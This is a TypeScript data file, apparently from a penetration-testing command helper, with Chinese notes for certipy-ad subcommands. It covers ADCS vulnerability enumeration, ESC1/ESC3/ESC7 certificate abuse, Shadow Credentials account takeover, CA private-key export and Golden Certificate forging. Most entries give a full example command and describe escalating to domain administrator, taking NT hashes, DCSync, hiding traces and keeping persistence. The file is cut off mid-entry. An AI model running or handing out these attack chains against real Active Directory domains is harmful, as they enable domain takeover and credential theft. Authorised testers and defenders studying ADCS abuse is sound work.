// 参数定义来源为本机 certipy-ad v5.0.4 --help 与官方 wiki (https://github.com/ly4k/Certipy/wiki)
import type { Tool } from '../../types';
import { buildCertipyAuth, v } from '../../lib/auth';

export const certipyTools: Tool[] = [
  {
    id: 'certipy-find',
    name: 'certipy-ad find',
    category: 'certipy',
    homepage: 'https://github.com/ly4k/Certipy/wiki',
    description: '枚举 ADCS,识别 ESC1-ESC16 漏洞与错误配置 (v5)',
    commands: [
      {
        id: 'certipy-find-vulnerable',
        title: '只显示存在漏洞的模板',
        description: '-vulnerable 基于嵌套组成员关系过滤出当前用户可利用的漏洞模板,-stdout 直接输出到控制台',
        build: (p) => `${buildCertipyAuth(p, 'find')} -vulnerable -stdout`,
        usage: `关键参数:
  -u USER@DOMAIN   认证用户,格式必须为 用户名@域名 (v5 写法)
  -p PASS / -hashes [LM:]NT / -k -no-pass / -aes HEXKEY -k  四种认证方式
  -dc-ip IP        域控 IP;省略时使用 -u 中的域名部分 (FQDN) 解析
  -vulnerable      只显示对当前用户 (含嵌套组成员关系) 存在漏洞的证书模板
  -stdout          结果直接打印到控制台而不是写文件
说明: 这是最常用的 ADCS 侦察入口。v5 会识别 ESC1-ESC16 全系列配置问题,
包括 ESC1 (模板允许请求方提供 SAN)、ESC4 (模板 ACL 可写)、
ESC8 (Web Enrollment 端点可 Relay)、ESC9/ESC16 (无安全扩展/弱证书映射) 等。
输出中每个模板会标注漏洞编号与原因,据此选择后续 req/relay 利用路径。`,
        example: 'certipy-ad find -u jdoe@corp.local -p Password123 -dc-ip 192.168.1.10 -vulnerable -stdout',
      },
      {
        id: 'certipy-find-json',
        title: '导出 JSON 结果',
        description: '-json 输出 JSON 格式,-output 指定文件名前缀,便于后续脚本处理',
        build: (p) => `${buildCertipyAuth(p, 'find')} -json -output ${v(p.fileName, 'OUTPUT_PREFIX')}`,
        usage: `关键参数:
  -json            以 JSON 格式输出枚举结果
  -output PREFIX   写文件时的文件名前缀 (与 -text/-json/-csv 配合)
  -dc-ip IP        域控 IP
  -enabled         只显示已在 CA 上启用的模板 (可叠加)
说明: JSON 输出包含模板 ACL、EKU、注册权限、CA 配置等完整字段,
适合存档比对或喂给自定义脚本做进一步筛选 (如批量找出允许 ENROLLEE_SUPPLIES_SUBJECT 的模板)。`,
        example: 'certipy-ad find -u jdoe@corp.local -p Password123 -dc-ip 192.168.1.10 -json -output adcs_find',
      },
      {
        id: 'certipy-find-enabled',
        title: '只显示已启用的模板',
        description: '-enabled 过滤掉未在任何 CA 上发布的模板,聚焦实际可申请的目标',
        build: (p) => `${buildCertipyAuth(p, 'find')} -enabled -stdout`,
        usage: `关键参数:
  -enabled         只显示已在 CA 上启用 (发布) 的证书模板
  -stdout          结果直接打印到控制台
  -dc-ip IP        域控 IP
说明: 漏洞模板若未在 CA 上发布则无法直接申请。-enabled 帮你排除噪音,
配合 -vulnerable 使用 (-enabled -vulnerable) 可直接得到"立即可打"的清单,
对应 ESC1/ESC3 等需要实际发起证书申请的攻击路径。`,
        example: 'certipy-ad find -u jdoe@corp.local -p Password123 -dc-ip 192.168.1.10 -enabled -stdout',
      },
      {
        id: 'certipy-find-dc-only',
        title: '仅查询域控 (低噪音)',
        description: '-dc-only 只从 DC 收集数据,不查询 CA 安全配置、不探测 Web Enrollment',
        build: (p) => `${buildCertipyAuth(p, 'find')} -dc-only -stdout`,
        usage: `关键参数:
  -dc-only         仅从域控 LDAP 收集数据;不会检索 CA 的安全/配置信息,
                   也不会检查 Web Enrollment (因此无法识别 ESC8)
  -stdout          结果直接打印到控制台
  -dc-ip IP        域控 IP
说明: 只走 LDAP,不与 CA 服务器交互,流量最小、最不容易触发告警。
代价是看不到 CA 本身的配置问题 (如 EDITF_ATTRIBUTESUBJECTALTNAME2 对应的 ESC6、
Web Enrollment 对应的 ESC8、IF_ENFORCEENCRYPTICERTREQUEST 对应的 ESC11),
适合高监控环境下的第一轮摸底。`,
        example: 'certipy-ad find -u jdoe@corp.local -p Password123 -dc-ip 192.168.1.10 -dc-only -stdout',
      },
      {
        id: 'certipy-find-oids',
        title: '显示 OID (颁发策略)',
        description: '-oids 展示颁发策略 OID 及其属性,用于分析需要特定颁发策略的模板',
        build: (p) => `${buildCertipyAuth(p, 'find')} -oids -stdout`,
        usage: `关键参数:
  -oids            显示 OIDs (Issuance Policies,颁发策略) 及其属性
  -stdout          结果直接打印到控制台
  -dc-ip IP        域控 IP
说明: 某些证书模板要求请求满足特定颁发策略 (OID) 才能注册,
而颁发策略本身有自己的 ACL。查看 OID 对象可发现: 某 OID 授予了低权限组,
从而使原本"安全"的高价值模板变得可申请——这是模板间接提权的一类隐蔽路径。`,
        example: 'certipy-ad find -u jdoe@corp.local -p Password123 -dc-ip 192.168.1.10 -oids -stdout',
      },
    ],
  },
  {
    id: 'certipy-req',
    name: 'certipy-ad req',
    category: 'certipy',
    homepage: 'https://github.com/ly4k/Certipy/wiki',
    description: '向 CA 申请/取回证书 (ESC1/ESC3/ESC9 等利用的核心步骤,支持 RPC/DCOM/Web Enrollment)',
    commands: [
      {
        id: 'certipy-req-template',
        title: '申请证书模板',
        description: '-ca 指定 CA 名称,-template 指定模板 (默认 User),成功后保存为 <用户>.pfx',
        build: (p) => `${buildCertipyAuth(p, 'req')} -ca ${v(p.caName, 'CA_NAME')} -template ${v(p.certTemplate, 'TEMPLATE')}`,
        usage: `关键参数:
  -ca CA_NAME      目标 CA 的名称 (RPC/DCOM 方式必填),如 CORP-CA
  -template NAME   要申请的证书模板 (默认: User)
  -dc-ip IP        域控 IP
  -retrieve ID     用请求 ID 取回已签发的证书 (代替发起新申请)
  -key-size BITS   RSA 密钥长度 (默认 2048)
输出: 成功后证书+私钥保存为 <账户名>.pfx。
说明: 最基础的证书申请。对无漏洞的普通模板,证书只能以本人身份使用;
真正的提权来自可操控 SAN 的模板 (见 -upn/-dns 条目)。`,
        example: 'certipy-ad req -u jdoe@corp.local -p Password123 -dc-ip 192.168.1.10 -ca CORP-CA -template User',
      },
      {
        id: 'certipy-req-upn',
        title: 'ESC1 - 伪造 UPN 申请管理员证书',
        description: '模板启用 ENROLLEE_SUPPLIES_SUBJECT 时用 -upn 把 SAN 写成域管理员',
        build: (p) => `${buildCertipyAuth(p, 'req')} -ca ${v(p.caName, 'CA_NAME')} -template ${v(p.certTemplate, 'TEMPLATE')} -upn administrator@${v(p.domain, 'DOMAIN')}`,
        usage: `关键参数:
  -upn UPN         写入证书 SAN 的用户主体名,如 administrator@corp.local
  -ca CA_NAME / -template NAME  目标 CA 与漏洞模板
  -dc-ip IP        域控 IP
攻击场景 (ESC1): 模板同时满足: 允许请求方提供主题 (ENROLLEE_SUPPLIES_SUBJECT)、
包含客户端认证 EKU、低权限用户可注册、无需经理审批。此时用 -upn 指定
域管理员,CA 会签发一张"属于 administrator"的证书,随后 certipy-ad auth -pfx
即可换取管理员 TGT 与 NT 哈希。
注意: v5 已移除 v4 的 -alt 参数,伪造用户一律用 -upn。`,
        example: 'certipy-ad req -u jdoe@corp.local -p Password123 -dc-ip 192.168.1.10 -ca CORP-CA -template VulnTemplate -upn administrator@corp.local',
      },
      {
        id: 'certipy-req-dns',
        title: 'ESC1 - 伪造 DNS 申请机器证书',
        description: '以机器账户身份申请时用 -dns 把 SAN 写成域控 FQDN,冒充 DC$',
        build: (p) => `${buildCertipyAuth(p, 'req')} -ca ${v(p.caName, 'CA_NAME')} -template ${v(p.certTemplate, 'TEMPLATE')} -dns ${v(p.dcFQDN, 'DC_FQDN')}`,
        usage: `关键参数:
  -dns DNS_NAME    写入证书 SAN 的 DNS 名,如 dc01.corp.local
  -ca CA_NAME / -template NAME  目标 CA 与漏洞模板
  -dc-ip IP        域控 IP
攻击场景: 机器账户申请证书时 SAN 用 dNSHostName 校验。若你控制了机器账户
(自建机器账户/Relay 得到 DC$ 认证),且模板允许提供 SAN,可用 -dns 指定
域控 FQDN 拿到 DC$ 的机器证书,再 auth 换 TGT 后 DCSync。
ESC9 变体: 模板不含安全扩展 (szOID_NTDS_CA_SECURITY_EXT) 时,
先改账户 UPN 再申请也能达成类似效果。`,
        example: 'certipy-ad req -u evilpc$@corp.local -p Password123 -dc-ip 192.168.1.10 -ca CORP-CA -template VulnTemplate -dns dc01.corp.local',
      },
      {
        id: 'certipy-req-web',
        title: '通过 Web Enrollment 申请',
        description: '-web 走 HTTP(S) Web Enrollment 而非 RPC,可用 -http-scheme/-http-port 调整',
        build: (p) => `${buildCertipyAuth(p, 'req')} -ca ${v(p.caName, 'CA_NAME')} -template ${v(p.certTemplate, 'TEMPLATE')} -web`,
        usage: `关键参数:
  -web                  使用 Web Enrollment (HTTP/HTTPS) 代替 RPC 申请
  -http-scheme SCHEME   HTTP 协议 (默认 http);CA 强制 HTTPS 时写 https
  -http-port PORT       Web Enrollment 端口 (默认 http 80 / https 443)
  -no-channel-binding   禁用 HTTP 通道绑定
  -ca CA_NAME / -template NAME  目标 CA 与模板
说明: 当 CA 的 RPC 接口不可达 (防火墙只放行 80/443) 或目标只部署了
Web Enrollment 时使用。ESC8 修复后 Web Enrollment 仍可用于正常申请,
只是无法再被 NTLM Relay。`,
        example: 'certipy-ad req -u jdoe@corp.local -p Password123 -dc-ip 192.168.1.10 -ca CORP-CA -template User -web -http-scheme https',
      },
      {
        id: 'certipy-req-on-behalf-of',
        title: 'ESC3 - 代理注册 (on-behalf-of)',
        description: '先用注册代理模板拿代理证书,再用 -on-behalf-of 代其他用户申请',
        build: (p) => `${buildCertipyAuth(p, 'req')} -ca ${v(p.caName, 'CA_NAME')} -template ${v(p.certTemplate, 'TEMPLATE')} -on-behalf-of ${v(p.domain, 'DOMAIN')}\\${v('', 'TARGET_USER')} -pfx ${v(p.fileName, 'AGENT.pfx')}`,
        usage: `关键参数:
  -on-behalf-of DOMAIN\\ACCOUNT  以注册代理身份代为申请的目标账户
  -pfx FILE        注册代理证书 (PFX),即第一步申请到的代理证书
  -pfx-password P  PFX 文件密码 (如设置过)
  -ca CA_NAME / -template NAME  目标 CA 与最终想要的模板
攻击场景 (ESC3): 第一步: 申请"证书请求代理"模板 (Certificate Request Agent)。
第二步: 用该代理证书 + 本参数,为任意用户 (如 administrator) 申请一张
要求"注册代理签名"的模板证书,从而绕过"只有特权组能注册"的限制。
完整示例见官方 wiki ESC3 章节。`,
        example: 'certipy-ad req -u jdoe@corp.local -p Password123 -dc-ip 192.168.1.10 -ca CORP-CA -template User -on-behalf-of corp\\administrator -pfx agent.pfx',
      },
    ],
  },
  {
    id: 'certipy-auth',
    name: 'certipy-ad auth',
    category: 'certipy',
    homepage: 'https://github.com/ly4k/Certipy/wiki',
    description: '用证书认证: PKINIT 换取 TGT 与 NT 哈希,或经 Schannel 建立 LDAP 会话',
    commands: [
      {
        id: 'certipy-auth-pfx',
        title: '用 PFX 获取 TGT 和 NT 哈希',
        description: 'PKINIT 认证,输出 <用户>.ccache 并通过 UnPAC-the-Hash 恢复 NT 哈希',
        build: (p) => `certipy-ad auth -pfx ${v(p.fileName, 'USER.pfx')} -dc-ip ${v(p.dcIP, 'DC_IP')}`,
        usage: `关键参数:
  -pfx FILE      证书+私钥文件 (PFX/P12 格式),必填
  -dc-ip IP      域控 IP;省略时按证书中的域名解析
  -username U / -domain D  指定认证身份;省略时自动从证书中提取
  -password P    PFX 文件密码 (如设置过)
  -no-save       不把 TGT 保存为文件
  -no-hash       不请求 NT 哈希 (只取 TGT)
输出: 默认保存 <用户>.ccache,并打印该账户的 NT 哈希 (UnPAC-the-Hash)。
使用: export KRB5CCNAME=<用户>.ccache 后,impacket 工具用 -k -no-pass 认证。
说明: ESC1/Shadow Credentials/relay 拿到证书后的标准收尾动作。`,
        example: 'certipy-ad auth -pfx administrator.pfx -dc-ip 192.168.1.10',
      },
      {
        id: 'certipy-auth-ldap-shell',
        title: 'Schannel LDAP Shell',
        description: '-ldap-shell 用证书经 Schannel 认证 LDAP,进入交互式 shell 改对象属性',
        build: (p) => `certipy-ad auth -pfx ${v(p.fileName, 'USER.pfx')} -dc-ip ${v(p.dcIP, 'DC_IP')} -ldap-shell`,
        usage: `关键参数:
  -ldap-shell        通过 Schannel 用证书对 LDAP 认证,获得交互式 LDAP shell
  -pfx FILE          证书+私钥文件 (PFX/P12),必填
  -dc-ip IP          域控 IP
  -ldap-scheme S     LDAP 协议 (默认 ldaps)
  -ldap-port PORT    LDAP 端口 (默认 ldaps 636 / ldap 389)
攻击场景: 拿到机器账户证书 (如 Relay 到 DC$) 但 PKINIT 不可用时的备用路径。
shell 内可直接修改对象属性,典型用法是给自己的机器账户写
msDS-AllowedToActOnBehalfOfOtherIdentity 完成 RBCD 配置,
或重置目标账户密码。`,
        example: 'certipy-ad auth -pfx dc01.pfx -dc-ip 192.168.1.10 -ldap-shell',
      },
      {
        id: 'certipy-auth-kirbi',
        title: '输出 Kirbi 格式票据',
        description: '-kirbi 把 TGT 存为 Kirbi (默认 ccache),-print 直接打印到控制台',
        build: (p) => `certipy-ad auth -pfx ${v(p.fileName, 'USER.pfx')} -dc-ip ${v(p.dcIP, 'DC_IP')} -kirbi`,
        usage: `关键参数:
  -kirbi         把 Kerberos TGT 保存为 Kirbi 格式 (默认是 ccache)
  -print         把 Kirbi 格式 TGT 直接打印到控制台
  -pfx FILE      证书+私钥文件 (PFX/P12),必填
  -dc-ip IP      域控 IP
说明: Kirbi 是 Rubeus/mimikatz 的票据格式。在 Linux 上拿到证书后,
输出 Kirbi 传到 Windows 目标机,用 Rubeus ptt /ticket:<kirbi> 或
mimikatz kerberos::ptt 注入内存,即可完成 pass-the-ticket。`,
        example: 'certipy-ad auth -pfx administrator.pfx -dc-ip 192.168.1.10 -kirbi',
      },
    ],
  },
  {
    id: 'certipy-shadow',
    name: 'certipy-ad shadow',
    category: 'certipy',
    homepage: 'https://github.com/ly4k/Certipy/wiki',
    description: 'Shadow Credentials 攻击: 操纵账户的 msDS-KeyCredentialLink 实现接管 (子动作 list/add/remove/clear/info/auto)',
    commands: [
      {
        id: 'certipy-shadow-auto',
        title: 'auto - 全自动接管',
        description: '添加 Key Credential、PKINIT 认证取 TGT+NT 哈希、恢复原有属性,一步到位',
        build: (p) => `${buildCertipyAuth(p, 'shadow')} auto -account ${v('', 'TARGET_ACCOUNT')}`,
        usage: `位置参数:
  {list,add,remove,clear,info,auto}  子动作;auto 为全自动利用
关键参数:
  -account ACCOUNT  目标账户 (SAM 名);省略时使用 -u 中的用户
  -dc-ip IP         域控 IP
攻击场景: 你对目标账户有 GenericWrite/WriteProperty (msDS-KeyCredentialLink)
权限时 (常见于 RBCD 链、ACL 误配),auto 自动完成: 生成密钥对 → 写入
KeyCredentialLink → PKINIT 取 TGT 并恢复 NT 哈希 → 删除添加的凭据。
输出 <账户>.ccache,目标全程无感知、无需改密码。`,
        example: 'certipy-ad shadow -u jdoe@corp.local -p Password123 -dc-ip 192.168.1.10 auto -account victim$',
      },
      {
        id: 'certipy-shadow-add',
        title: 'add - 手动添加密钥凭据',
        description: '只写入新的 Key Credential,输出 PFX;之后用 certipy-ad auth -pfx 认证',
        build: (p) => `${buildCertipyAuth(p, 'shadow')} add -account ${v('', 'TARGET_ACCOUNT')}`,
        usage: `位置参数:
  add              在目标账户上创建新的 Key Credential Link
关键参数:
  -account ACCOUNT  目标账户 (SAM 名)
  -out FILE         输出文件名 (保存证书/结果)
  -dc-ip IP         域控 IP
说明: 与 auto 不同,add 只做"写入"这一步,成功后得到一张设备证书 (PFX),
后续手动执行 certipy-ad auth -pfx <文件> 换取 TGT 与 NT 哈希。
适合需要分步操作、或想保留持久化凭据的场景 (配合 remove/clear 收尾)。`,
        example: 'certipy-ad shadow -u jdoe@corp.local -p Password123 -dc-ip 192.168.1.10 add -account victim$',
      },
      {
        id: 'certipy-shadow-list',
        title: 'list - 列出密钥凭据',
        description: '查看目标账户当前所有 Key Credential Link,确认是否已有凭据可清除',
        build: (p) => `${buildCertipyAuth(p, 'shadow')} list -account ${v('', 'TARGET_ACCOUNT')}`,
        usage: `位置参数:
  list             列出目标账户的全部 Key Credential Link
关键参数:
  -account ACCOUNT  目标账户 (SAM 名)
  -dc-ip IP         域控 IP
说明: 攻击前侦察 (目标是否已有合法设备凭据,避免误删被发现) 与
攻击后核对 (确认 add/auto 是否写入成功) 都使用该子动作。
进一步查看某条凭据的详细信息可用 info + -device-id。`,
        example: 'certipy-ad shadow -u jdoe@corp.local -p Password123 -dc-ip 192.168.1.10 list -account victim$',
      },
      {
        id: 'certipy-shadow-remove',
        title: 'remove - 按 Device ID 删除',
        description: '-device-id 精确删除指定 Key Credential,用于清理自己写入的凭据',
        build: (p) => `${buildCertipyAuth(p, 'shadow')} remove -account ${v('', 'TARGET_ACCOUNT')} -device-id ${v('', 'DEVICE_ID')}`,
        usage: `位置参数:
  remove           删除目标账户上指定的 Key Credential Link
关键参数:
  -account ACCOUNT    目标账户 (SAM 名)
  -device-id ID       要删除的 Key Credential 的 Device ID
                      (add 时输出,或先 list 查询)
  -dc-ip IP           域控 IP
说明: 精确清理,只删自己写入的那一条,不影响目标原有凭据——
比 clear (删全部) 更隐蔽,是手动 add 流程的标准收尾。`,
        example: 'certipy-ad shadow -u jdoe@corp.local -p Password123 -dc-ip 192.168.1.10 remove -account victim$ -device-id 6d8f9c2e-1234-5678-abcd-0123456789ab',
      },
      {
        id: 'certipy-shadow-clear',
        title: 'clear - 清空全部密钥凭据',
        description: '删除目标账户的所有 Key Credential Link;注意会移除合法设备凭据',
        build: (p) => `${buildCertipyAuth(p, 'shadow')} clear -account ${v('', 'TARGET_ACCOUNT')}`,
        usage: `位置参数:
  clear            删除目标账户的全部 Key Credential Link
关键参数:
  -account ACCOUNT  目标账户 (SAM 名)
  -dc-ip IP         域控 IP
警告: clear 会连同目标原有的合法设备凭据 (如 WHfB/Hello for Business
注册的密钥) 一并删除,可能造成用户登录异常而被发现。
仅在确认目标没有合法凭据 (先 list 核对) 或测试环境中使用;
正常情况下优先用 remove + -device-id 精确清理。`,
        example: 'certipy-ad shadow -u jdoe@corp.local -p Password123 -dc-ip 192.168.1.10 clear -account victim$',
      },
    ],
  },
  {
    id: 'certipy-ca',
    name: 'certipy-ad ca',
    category: 'certipy',
    homepage: 'https://github.com/ly4k/Certipy/wiki',
    description: '管理 CA: 模板发布、请求审批、角色分配与 CA 私钥备份 (ESC7 利用与 Golden Certificate 前置)',
    commands: [
      {
        id: 'certipy-ca-list-templates',
        title: '列出 CA 已启用的模板',
        description: '-list-templates 显示该 CA 当前发布的全部证书模板',
        build: (p) => `${buildCertipyAuth(p, 'ca')} -ca ${v(p.caName, 'CA_NAME')} -list-templates`,
        usage: `关键参数:
  -ca CA_NAME       目标 CA 名称 (v5 中 ca 子命令多数操作需要)
  -list-templates   列出该 CA 上所有已启用的证书模板
  -dc-ip IP         域控 IP
说明: 注意 v5 已将 v4 的 -list 改名为 -list-templates,且必须带 -ca。
用于确认目标模板是否已发布;ESC7 链中拿到 ManageCA 后,
先用它核对再用 -enable-template 发布目标模板。`,
        example: 'certipy-ad ca -u jdoe@corp.local -p Password123 -dc-ip 192.168.1.10 -ca CORP-CA -list-templates',
      },
      {
        id: 'certipy-ca-backup',
        title: '备份 CA 证书与私钥',
        description: '-backup 通过 ICertAdminD 接口导出 CA 私钥 (PFX),是 Golden Certificate 的前置',
        build: (p) => `${buildCertipyAuth(p, 'ca')} -ca ${v(p.caName, 'CA_NAME')} -backup`,
        usage: `关键参数:
  -backup              备份 CA 证书和私钥,输出为 PFX 文件
  -ca CA_NAME          目标 CA 名称
  -config MACHINE\\CA  CA 配置字符串 (格式 主机名\\CA名),
                       不指定 -ca 的自动发现时可显式给出
  -dynamic-endpoint    优先使用动态 TCP 端点而非命名管道
  -dc-ip IP            域控 IP
攻击场景: 对 CA 服务器有本地管理员权限 (或备份权限) 时,导出 CA 私钥后
即可离线伪造任意用户证书——配合 certipy-ad forge -ca-pfx 实现
Golden Certificate 持久化 (不依赖 krbtgt,CA 轮换前长期有效)。`,
        example: 'certipy-ad ca -u admin@corp.local -p Password123 -dc-ip 192.168.1.10 -ca CORP-CA -backup',
      },
      {
        id: 'certipy-ca-issue-request',
        title: '批准挂起的证书请求',
        description: '-issue-request 签发 pending/failed 的请求,ESC7 链中绕过经理审批的关键一步',
        build: (p) => `${buildCertipyAuth(p, 'ca')} -ca ${v(p.caName, 'CA_NAME')} -issue-request ${v('', 'REQUEST_ID')}`,
        usage: `关键参数:
  -issue-request ID  签发指定 ID 的挂起 (pending) 或失败的证书请求
  -deny-request ID   拒绝指定 ID 的挂起请求
  -ca CA_NAME        目标 CA 名称
  -dc-ip IP          域控 IP
攻击场景 (ESC7): 你拥有 CA 的 ManageCertificates (证书管理员/Officer) 权限时,
先让普通账户对"需经理审批"的高价值模板发起申请 (得到 pending 请求 ID),
再用本参数自己批准,绕过审批限制;随后 certipy-ad req -retrieve ID 取回证书。`,
        example: 'certipy-ad ca -u officer@corp.local -p Password123 -dc-ip 192.168.1.10 -ca CORP-CA -issue-request 1337',
      },
      {
        id: 'certipy-ca-enable-template',
        title: '在 CA 上启用模板',
        description: '-enable-template 发布模板,ESC7 (ManageCA) 把漏洞模板发布出去再利用',
        build: (p) => `${buildCertipyAuth(p, 'ca')} -ca ${v(p.caName, 'CA_NAME')} -enable-template ${v(p.certTemplate, 'TEMPLATE')}`,
        usage: `关键参数:
  -enable-template NAME   在该 CA 上启用 (发布) 指定证书模板
  -disable-template NAME  从该 CA 上禁用指定证书模板
  -ca CA_NAME             目标 CA 名称
  -dc-ip IP               域控 IP
攻击场景 (ESC7): 你拥有 CA 的 ManageCA 权限时,可以把一个存在 ESC1 条件
但未发布的模板 (如 SubCA) 启用,然后 certipy-ad req 直接申请提权;
完事后用 -disable-template 恢复原状。`,
        example: 'certipy-ad ca -u caadmin@corp.local -p Password123 -dc-ip 192.168.1.10 -ca CORP-CA -enable-template SubCA',
      },
      {
        id: 'certipy-ca-add-officer',
        title: '添加证书管理员 (Officer)',
        description: '-add-officer 授予账户 ManageCertificates 权限,可批准任意挂起请求',
        build: (p) => `${buildCertipyAuth(p, 'ca')} -ca ${v(p.caName, 'CA_NAME')} -add-officer ${v(p.username, 'USER')}`,
        usage: `关键参数:
  -add-officer USER      添加证书管理员 (Certificate Manager/Officer)
  -remove-officer USER   移除已有 Officer
  -add-manager USER / -remove-manager USER  增删 CA 管理员 (ManageCA)
  -ca CA_NAME            目标 CA 名称
  -dc-ip IP              域控 IP
攻击场景: 已控制 CA 时,给自己的低权限账户加 Officer 角色,
即可获得批准/拒绝任意证书请求的能力 (等价拿到 ESC7 的
ManageCertificates 原语),作为持久化或权限下放手段;
收队时用 -remove-officer 还原。`,
        example: 'certipy-ad ca -u admin@corp.local -p Password123 -dc-ip 192.168.1.10 -ca CORP-CA -add-officer jdoe',
      },
    ],
  },
  {
    id: 'certipy-forge',
    name: 'certipy-ad forge',
    category: 'certipy',
    homepage: 'https://github.com/ly4k/Certipy/wiki',
    description: '用泄露的 CA 私钥伪造任意身份证书 (Golden Certificate),或生成自签名 CA',
    commands: [
      {
        id: 'certipy-forge-golden-upn',
        title: '黄金证书 - 伪造用户',
        description: '-ca-pfx 提供被盗 CA 私钥,-upn 指定要冒充的用户,纯离线签发',
        build: (p) => `certipy-ad forge -ca-pfx ${v(p.fileName, 'CA.pfx')} -upn administrator@${v(p.domain, 'DOMAIN')}`,
        usage: `关键参数:
  -ca-pfx FILE        CA 证书+私钥 (PFX/P12),来自 ca -backup;必填 (否则生成自签名 CA)
  -ca-password P      CA PFX 文件密码 (如设置过)
  -upn UPN            写入证书 SAN 的用户主体名,如 administrator@corp.local
  -out FILE           伪造证书+私钥的输出文件 (PFX)
  -validity-period N  有效期天数 (默认 365)
  -serial SN          自定义序列号 (可伪造得更像真实 CA 签发)
说明: 整个过程离线进行,不接触 DC/CA,无任何日志。输出的 PFX 直接用
certipy-ad auth -pfx 换取目标用户 TGT 与 NT 哈希。
只要 CA 证书未过期/未吊销,伪造证书长期有效——比黄金票据更持久的后门。`,
        example: 'certipy-ad forge -ca-pfx CORP-CA.pfx -upn administrator@corp.local',
      },
      {
        id: 'certipy-forge-golden-sid',
        title: '黄金证书 - 指定 SID 与 DNS',
        description: '-sid/-dns 精确控制 SAN,伪造机器账户 (如 DC$) 证书用于 DCSync',
        build: (p) => `certipy-ad forge -ca-pfx ${v(p.fileName, 'CA.pfx')} -dns ${v(p.dcFQDN, 'DC_FQDN')} -sid ${v('', 'OBJECT_SID')}`,
        usage: `关键参数:
  -dns DNS_NAME    写入 SAN 的 DNS 名 (机器身份,如 dc01.corp.local)
  -sid OBJECT_SID  写入 SAN 的对象 SID (证书映射强化后用于身份绑定)
  -subject SUBJ    证书 Subject,如 CN=Administrator,CN=Users,DC=CORP,DC=LOCAL
  -template FILE   从现有模板证书 (PFX) 克隆属性,让伪造证书更像正常签发
  -issuer ISSUER   指定 Issuer 字段 (默认取 CA 证书中的颁发者)
  -ca-pfx FILE     CA 证书+私钥 (PFX/P12)
说明: 在启用强证书映射 (Full Enforcement) 的环境中,只伪造 UPN 可能不够,
需要同时带上目标对象的 SID (san otherName 扩展)。伪造 DC$ 证书后
auth 换 TGT 即可 DCSync。`,
        example: 'certipy-ad forge -ca-pfx CORP-CA.pfx -dns dc01.corp.local -sid S-1-5-21-1334961600-1763989488-2140997488-1000',
      },
      {
        id: 'certipy-forge-selfsigned',
        title: '生成自签名 CA 与证书',
        description: '不提供 -ca-pfx 时生成自签名根 CA,用于构建独立证书链 (测试/SMIME 场景)',
        build: (p) => `certipy-ad forge -upn administrator@${v(p.domain, 'DOMAIN')} -out ${v(p.fileName, 'OUTPUT.pfx')}`,
        usage: `关键参数:
  (省略 -ca-pfx)   自动生成一个自签名根 CA,并用它签发证书
  -upn UPN / -dns NAME / -subject SUBJ  证书身份信息
  -key-size BITS   RSA 密钥长度 (默认 2048)
  -out FILE        输出文件 (PFX)
  -pfx-password P  保护输出 PFX 的密码
说明: 自签名 CA 不被域信任,不能用于域内 Kerberos 认证。
用途是搭建独立 PKI 测试环境、生成 SMIME 证书 (-smime/-application-policies
控制扩展),或研究证书解析行为,而非域内提权。`,
        example: 'certipy-ad forge -upn test@test.local -out test.pfx',
      },
    ],
  },
  {
    id: 'certipy-cert',
    name: 'certipy-ad cert',
    category: 'certipy',
    homepage: 'https://github.com/ly4k/Certipy/wiki',
    description: '本地证书格式处理: 合并/拆分 PEM/DER/PFX,设置导出密码',
    commands: [
      {
        id: 'certipy-cert-merge',
        title: '合并 key+cert 为 PFX',
        description: '-key 与 -cert 读取 PEM/DER 私钥和证书,-export 打包为 PFX',
        build: (p) => `certipy-ad cert -key ${v('', 'key.pem')} -cert ${v('', 'cert.pem')} -export -out ${v(p.fileName, 'out.pfx')}`,
        usage: `输入参数:
  -key FILE    从 PEM/DER 文件读取私钥
  -cert FILE   从 PEM/DER 文件读取证书
  -pfx FILE    或直接读取 PFX/P12 (与 -key/-cert 二选一)
输出参数:
  -export      导出为 PFX/P12 (默认格式)
  -out FILE    输出文件名
  -export-password P  保护输出 PFX 的密码
说明: 纯本地操作,无任何网络/认证参数。典型场景: 从其他工具
(如 openssl、ForgeCert) 得到分离的 key/cert 文件,打包成 certipy-ad auth
可直接使用的 PFX。`,
        example: 'certipy-ad cert -key administrator.key -cert administrator.crt -export -out administrator.pfx',
      },
      {
        id: 'certipy-cert-split',
        title: '从 PFX 拆分证书/私钥',
        description: '-nokey 只导证书,-nocert 只导私钥,用于提取单个组件',
        build: (p) => `certipy-ad cert -pfx ${v(p.fileName, 'USER.pfx')} -nokey -out ${v('', 'cert.pem')}`,
        usage: `输入参数:
  -pfx FILE      读取 PFX/P12 文件
  -password P    输入 PFX 的密码 (如设置过)
输出参数:
  -nokey         输出中不包含私钥 (只导证书)
  -nocert        输出中不包含证书 (只导私钥)
  -out FILE      输出文件名
说明: 把 PFX 拆成单独的证书或私钥文件,便于交给需要 PEM 格式的工具,
或在做证书链分析、公钥比对时单独提取。`,
        example: 'certipy-ad cert -pfx administrator.pfx -nokey -out administrator.crt',
      },
      {
        id: 'certipy-cert-password',
        title: '重打包并设置密码',
        description: '读取 PFX 后用 -export-password 重新加密导出,兼容只认加密 PFX 的工具',
        build: (p) => `certipy-ad cert -pfx ${v(p.fileName, 'USER.pfx')} -export -out ${v('', 'protected.pfx')} -export-password ${v(p.password, 'PASSWORD')}`,
        usage: `输入参数:
  -pfx FILE           读取 PFX/P12 文件
  -password P         输入 PFX 的密码
输出参数:
  -export             导出为 PFX/P12
  -out FILE           输出文件名
  -export-password P  给输出 PFX 设置新密码
说明: 部分工具/系统不接受空密码的 PFX,或要求特定加密强度。
用本命令把 certipy 生成的无密码 PFX 重打包为带密码版本,
导入 Windows 证书存储或 Rubeus /pfx 场景更稳。`,
        example: 'certipy-ad cert -pfx administrator.pfx -export -out admin_protected.pfx -export-password Passw0rd!',
      },
    ],
  },
  {
    id: 'certipy-account',
    name: 'certipy-ad account',
    category: 'certipy',
    homepage: 'https://github.com/ly4k/Certipy/wiki',
    description: '管理 AD 用户/机器账户: 创建、读取、更新 (DNS/UPN/SPN/密码)、删除',
    commands: [
      {
        id: 'certipy-account-create',
        title: 'create - 创建机器账户',
        description: '利用 MachineAccountQuota 创建机器账户,-pass 设置密码,RBCD/资源委派攻击的第一步',
        build: (p) => `${buildCertipyAuth(p, 'account')} -user ${v('', 'MACHINE$')} -pass ${v('', 'PASSWORD')} create`,
        usage: `位置参数:
  {create,read,update,delete}  账户操作
关键参数:
  -user SAM_NAME   目标账户登录名 (必填),机器账户以 $ 结尾
  -pass PASSWORD   设置账户密码
  -group DN        要加入的组 (省略时默认 CN=Computers,<默认路径>)
  -dns HOSTNAME    设置 DNS 主机名
